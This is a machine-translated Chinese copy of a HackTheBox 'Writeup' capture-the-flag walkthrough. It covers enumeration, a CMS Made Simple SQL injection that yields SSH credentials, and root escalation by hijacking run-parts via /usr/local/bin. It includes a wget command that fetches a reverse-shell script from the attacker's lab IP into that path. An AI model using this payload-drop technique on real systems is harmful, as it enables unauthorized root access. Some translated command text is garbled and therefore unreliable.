<html>
<head>
<title>Writeup — HackTheBox Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">写HackTheBox写</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/writeup-hackthebox-writeup-3c86bf40853b?source=collection_archive---------0-----------------------#2019-10-13">https://infosecwriteups.com/writeup-hackthebox-writeup-3c86bf40853b?source=collection_archive---------0-----------------------#2019-10-13</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="6dd3" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">Writeup本周退休，是一个非常简单的盒子，有一个有趣的技巧。我将从在<code class="fe kf kg kh ki b">robots.txt</code>文件中找到一个不允许的条目开始。在访问被禁止的条目时，我看到了一个看起来像是用一个叫做<code class="fe kf kg kh ki b">CMS Made Simple</code>的CMS托管的网站。该CMS有一个未经验证的sqli漏洞，我们通过利用sqli获取密码。我们使用从漏洞中找到的密码SSH到机器中，从而使用cronjob找到它。</h2></div><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi kj"><img src="../Images/502308f937e3fcb86f3323fd58cee96c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-QtWsjShnYOBTT8c1uti_g.png"/></div></div><figcaption class="kv kw gj gh gi kx ky bd b be z dk translated">信息卡</figcaption></figure><h1 id="e3e3" class="kz la iq bd lb lc ld le lf lg lh li lj jw lk jx ll jz lm ka ln kc lo kd lp lq bi translated">列举</h1><p id="a49e" class="pw-post-body-paragraph lr ls iq lt b lu lv jr lw lx ly ju lz ma mb mc md me mf mg mh mi mj mk ml mm ij bi translated">像往常一样，让我们从Nmap扫描开始</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi mn"><img src="../Images/ffdf4c3105c7a85fa7cdbe04c943eeca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*91odjTX1ONaJe8VGCT7YNQ.png"/></div></div></figure><p id="bceb" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated">我们有两个港口开放22 ( <code class="fe kf kg kh ki b"><strong class="lt ir">SSH</strong></code>)和80 ( <code class="fe kf kg kh ki b"><strong class="lt ir">HTTP</strong></code>)</p><h1 id="29e9" class="kz la iq bd lb lc ld le lf lg lh li lj jw lk jx ll jz lm ka ln kc lo kd lp lq bi translated">80 — HTTP</h1><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi mt"><img src="../Images/d2822efab5a271a7eb509ea85e3cc54f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VQqHiVpkvu2F2C0IxLg_fg.png"/></div></div></figure><p id="b07a" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated">查看<code class="fe kf kg kh ki b"><strong class="lt ir">robots.txt</strong> </code>文件，我们有一个不允许的条目<br/> <strong class="lt ir"> /writeup </strong></p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi mu"><img src="../Images/c8aae2f4a0d80c6eaa984e885f7370dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xBd6lDjOfaIRy9ibfjtgPw.png"/></div></div><figcaption class="kv kw gj gh gi kx ky bd b be z dk translated">robots.txt文件</figcaption></figure><p id="0e72" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated">让我们看看在“/ <code class="fe kf kg kh ki b">writeup</code>”中有什么。我运行了gobuster，它没有返回任何有用的信息，因为这个盒子有反DoS功能。</p><h2 id="3bf3" class="mv la iq bd lb mw mx dn lf my mz dp lj ma na nb ll me nc nd ln mi ne nf lp ng bi translated">/writeup目录</h2><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi nh"><img src="../Images/1fa5332c74f37432484f79b5d77fbfe3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qKJg_Xqd4CgQhT7MGZfs8w.png"/></div></div><figcaption class="kv kw gj gh gi kx ky bd b be z dk translated"><strong class="bd lb">/撰写页面</strong></figcaption></figure><p id="d8bd" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated">点击各种链接，直接浏览受尊敬的机器。我在检查网页源代码时发现了一个有趣的现象，那就是它使用的<code class="fe kf kg kh ki b"><strong class="lt ir">CMS</strong> </code>。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi ni"><img src="../Images/edf68d0a4d3b427d0718df511dc538e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7K7AVPRhMGLhYdoryqnklg.png"/></div></div><figcaption class="kv kw gj gh gi kx ky bd b be z dk translated">CMS变得简单</figcaption></figure><p id="89cc" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated">快速的<code class="fe kf kg kh ki b"><a class="ae nj" href="https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html" rel="noopener ugc nofollow" target="_blank"><strong class="lt ir">goole search</strong></a></code>给了我们有趣的结果。看来我们有一个未经认证的SQL注入，可以转储密码哈希。漏洞开发者也很友好地破解了这个杂凑。</p><div class="nk nl gp gr nm nn"><a href="https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html" rel="noopener  ugc nofollow" target="_blank"><div class="no ab fo"><div class="np ab nq cl cj nr"><h2 class="bd ir gy z fp ns fr fs nt fu fw ip bi translated">CMS做了简单的SQL注入</h2><div class="nu l"><h3 class="bd b gy z fp ns fr fs nt fu fw dk translated">信息安全服务、新闻、文件、工具、漏洞、咨询和白皮书</h3></div><div class="nv l"><p class="bd b dl z fp ns fr fs nt fu fw dk translated">packetstormsecurity.com</p></div></div></div></a></div><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi nw"><img src="../Images/1b9c3abc6bc3de8367cba0726cefd200.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0aYn4KBMsaoaptFOumRldA.png"/></div></div></figure><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi nx"><img src="../Images/9d0eeafa1045d29c0b04a45cac9e4909.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nJcttCmIS0sM3bKHA3AZJg.png"/></div></div></figure><p id="d47c" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated">在那里！我们已经得到了所有的细节。因为端口80没有任何登录页面，而且SSH是打开的，所以让我们尝试使用上面找到的凭证登录SSH。</p><h1 id="9e57" class="kz la iq bd lb lc ld le lf lg lh li lj jw lk jx ll jz lm ka ln kc lo kd lp lq bi translated">作为JKR的Shell</h1><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi ny"><img src="../Images/8fb5af05248c54e18fe47a574f692fb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8YgnHd_6mum_vHGrPzPamg.png"/></div></div></figure><h1 id="46da" class="kz la iq bd lb lc ld le lf lg lh li lj jw lk jx ll jz lm ka ln kc lo kd lp lq bi translated">root权限</h1><p id="4f2c" class="pw-post-body-paragraph lr ls iq lt b lu lv jr lw lx ly ju lz ma mb mc md me mf mg mh mi mj mk ml mm ij bi translated">有趣的是，用户<code class="fe kf kg kh ki b"><strong class="lt ir">JKR</strong></code>属于<code class="fe kf kg kh ki b"><strong class="lt ir">STAFF (50)</strong></code>组。</p><blockquote class="nz"><p id="07fd" class="oa ob iq bd oc od oe of og oh oi mm dk translated"><strong class="ak"> staff </strong>:允许用户在不需要root权限的情况下对系统(/usr/local)添加本地修改(注意/usr/local/bin中的可执行文件在任何用户的PATH变量中，它们可能会“覆盖”同名的/bin和/usr/bin中的可执行文件)。与“adm”组相比，它与监控/安全更相关。</p></blockquote><p id="d323" class="pw-post-body-paragraph lr ls iq lt b lu oj jr lw lx ok ju lz ma ol mc md me om mg mh mi on mk ml mm ij bi translated">这个许可可能对我们有用。PSPY向我们展示了一个有趣的过程。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oo"><img src="../Images/455e5f8a0fe4171f12f6ef7ac1246097.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6WFpMq-51qdFJ9SQpSmODw.png"/></div></div></figure><p id="901f" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated">每次用户通过SSH登录时，都会有一个由root运行的进程为该用户设置路径，而<code class="fe kf kg kh ki b"><strong class="lt ir">run-parts</strong></code> <strong class="lt ir">二进制文件在这里有一个本地路径(而不是/usr/local/bin/run-parts)。因为我们是group <br/> STAFF的一部分，所以我们可以将自己的run-parts二进制文件放在/usr/local/bin中。下次当新用户登录时，cron会执行我们自己的</strong> <code class="fe kf kg kh ki b"><strong class="lt ir">run-parts</strong></code> <strong class="lt ir">，我们可以在这里做任何事情。</strong></p><p id="ed2b" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated">让我们在<code class="fe kf kg kh ki b"><strong class="lt ir">/usr/local/bin/run-parts</strong></code>放一个反壳</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi op"><img src="../Images/b607abafbaa9ee51f59391ee873d1a96.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*14hHdAdsJBmYp8q587o1zQ.png"/></div></div></figure><p id="58da" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated">如果我们再次登录SSH，我们会得到一个反向的shell。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oq"><img src="../Images/eca02130678d178ee3e86c43abecc793.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6kY1DEvqgmHE7AOdRDMFIA.png"/></div></div><figcaption class="kv kw gj gh gi kx ky bd b be z dk translated">获得根壳</figcaption></figure><p id="bcfd" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated">复制步骤:</p><blockquote class="or os ot"><p id="ccf7" class="lr ls ou lt b lu mo jr lw lx mp ju lz ov mq mc md ow mr mg mh ox ms mk ml mm ij bi translated"><strong class="lt ir">&gt;<em class="iq">wget</em></strong><a class="ae nj" href="http://10.10.15.144/shell.py" rel="noopener ugc nofollow" target="_blank"><strong class="lt ir"><em class="iq">http://10 . 10 . 15 . 144/shell . py</em></strong></a><strong class="lt ir"><em class="iq">-O/usr/local/bin/run-parts<br/>&gt;chmod+x/usr/local/bin/run-parts<br/>&gt;确保添加那个语言的shebang(这里是python)。<br/> &gt;在新的终端再次登录进入SSH，并得到你的逆向shell </em> </strong> <em class="iq">。</em></p></blockquote><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oy"><img src="../Images/14257f354d48bbfe0b778d52718a2703.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lZ-IspourfvEVxmi5-HpIw.png"/></div></div><figcaption class="kv kw gj gh gi kx ky bd b be z dk translated">“shell.py”的内容</figcaption></figure><p id="9815" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated">就这样扎根了。</p><p id="85c1" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated">感谢和快乐的黑客，<br/> Preetham。</p><h1 id="579a" class="kz la iq bd lb lc ld le lf lg lh li lj jw lk jx ll jz lm ka ln kc lo kd lp lq bi translated">额外的</h1><h2 id="d56e" class="mv la iq bd lb mw mx dn lf my mz dp lj ma na nb ll me nc nd ln mi ne nf lp ng bi translated">Cron作业</h2><p id="762f" class="pw-post-body-paragraph lr ls iq lt b lu lv jr lw lx ly ju lz ma mb mc md me mf mg mh mi mj mk ml mm ij bi translated"><strong class="lt ir">sh-c/usr/bin/env-I PATH =/usr/local/sbin:/usr/local/bin:/usr/bin:/sbin:/bin run-parts—lsbsysinit/etc/update-motd . d&gt;/run/motd . dynamic . new</strong></p><p id="6d66" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated">update-motd由UNIX/Linux系统管理员使用，他们通常通过在/etc/motd文件中维护文本来与控制台和远程用户交流重要信息，这些文本由交互式shell登录上的<a class="ae nj" href="http://manpages.ubuntu.com/manpages/trusty/man8/pam_motd.8.html" rel="noopener ugc nofollow" target="_blank"> <strong class="lt ir"> pam_motd </strong> </a> (8)模块显示。</p><blockquote class="nz"><p id="2ea0" class="oa ob iq bd oc od oe of og oh oi mm dk translated">/etc/update-motd.d/*中的可执行脚本由<a class="ae nj" href="http://manpages.ubuntu.com/manpages/trusty/man8/pam_motd.8.html" rel="noopener ugc nofollow" target="_blank"> <strong class="ak"> pam_motd </strong> </a> (8)作为根用户在<br/>每次登录时执行，这些信息连接在/var/run/motd中。脚本<br/>的执行顺序由<a class="ae nj" href="http://manpages.ubuntu.com/manpages/trusty/man8/run-parts.8.html" rel="noopener ugc nofollow" target="_blank"> <strong class="ak">运行部分</strong> </a> (8) — lsbsysinit选项决定(基本上是按字母顺序<br/>执行，有一些注意事项)。</p></blockquote><p id="22b2" class="pw-post-body-paragraph lr ls iq lt b lu oj jr lw lx ok ju lz ma ol mc md me om mg mh mi on mk ml mm ij bi translated">这个机器还有另一个cronjob，它每3分钟清理一次/usr/local/bin /usr/local/sbin。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oz"><img src="../Images/7eb03349a8b762308eded34a65dd9922.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mGk-A9NjrHuh4vB-eZRnGg.png"/></div></div></figure></div><div class="ab cl pa pb hu pc" role="separator"><span class="pd bw bk pe pf pg"/><span class="pd bw bk pe pf pg"/><span class="pd bw bk pe pf"/></div><div class="ij ik il im in"><p id="131c" class="pw-post-body-paragraph lr ls iq lt b lu mo jr lw lx mp ju lz ma mq mc md me mr mg mh mi ms mk ml mm ij bi translated"><em class="ou">关注</em> <a class="ae nj" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="ou"> Infosec报道</em> </a> <em class="ou">获取更多此类精彩报道。</em></p><div class="nk nl gp gr nm nn"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="no ab fo"><div class="np ab nq cl cj nr"><h2 class="bd ir gy z fp ns fr fs nt fu fw ip bi translated">信息安全报道</h2><div class="nu l"><h3 class="bd b gy z fp ns fr fs nt fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="nv l"><p class="bd b dl z fp ns fr fs nt fu fw dk translated">medium.com</p></div></div><div class="ph l"><div class="pi l pj pk pl ph pm kt nn"/></div></div></a></div></div></div>    
</body>
</html>